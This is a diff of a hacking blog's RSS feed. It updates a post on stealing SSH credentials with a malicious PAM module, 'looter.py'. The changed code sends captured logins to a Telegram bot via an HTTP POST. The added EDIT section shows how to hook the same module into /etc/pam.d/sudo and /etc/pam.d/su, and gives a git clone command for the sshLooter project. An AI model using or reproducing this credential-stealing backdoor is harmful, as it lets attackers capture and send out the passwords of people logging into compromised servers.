@@ -5,8 +5,8 @@
     <description>Hacking and other stuffs</description>
     <link>http://localhost:4000//</link>
     <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 11 Feb 2018 23:28:30 -0200</pubDate>
-    <lastBuildDate>Sun, 11 Feb 2018 23:28:30 -0200</lastBuildDate>
+    <pubDate>Tue, 13 Feb 2018 05:05:27 -0200</pubDate>
+    <lastBuildDate>Tue, 13 Feb 2018 05:05:27 -0200</lastBuildDate>
     <generator>Jekyll v3.5.2</generator>
     
       <item>
@@ -106,8 +106,9 @@ pip install requests
 &lt;span class=&quot;s1&quot;&gt;def sendMessage(msg):&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;    apiKey = &amp;quot;API-KEY&amp;quot;&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;    userId = &amp;quot;USER-ID&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;s1&quot;&gt;    url = &amp;quot;https://api.telegram.org/bot{}/sendMessage?chat_id={}&amp;amp;text={}&amp;quot;.format(apiKey,userId,msg)&lt;/span&gt;
-&lt;span class=&quot;s1&quot;&gt;    r = requests.get(url)&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;    data = {&amp;quot;chat_id&amp;quot;:userId,&amp;quot;text&amp;quot;:msg}&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;    url = &amp;quot;https://api.telegram.org/bot{}/sendMessage&amp;quot;.format(apiKey)&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;    r = requests.post(url,json=data)&lt;/span&gt;
 
 &lt;span class=&quot;s1&quot;&gt;def check_pw(user, password):&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;Check the password matches local unix password on file&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
@@ -159,6 +160,22 @@ mkdir -p /lib/security/
 
 &lt;p&gt;In the final, when someone successfuly log on the server you’ll receive a message like that.
 &lt;img src=&quot;/assets/images/telegram-message-ssh-pam.jpg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;edit-13022018&quot;&gt;EDIT 13/02/2018&lt;/h4&gt;
+
+&lt;p&gt;It works on sudo an su too, just add the line above,&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;auth requisite pam_python.so looter.py&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;in files&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;/etc/pam.d/sudo
+/etc/pam.d/su&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Or just git clone the project and follow the instructions on README.md&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/mthbernardes/sshLooter.git&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
 </description>
         <pubDate>Sat, 10 Feb 2018 00:00:00 -0200</pubDate>
         <link>http://localhost:4000//persistence/2018/02/10/stealing-ssh-credentials-another-approach.html</link>
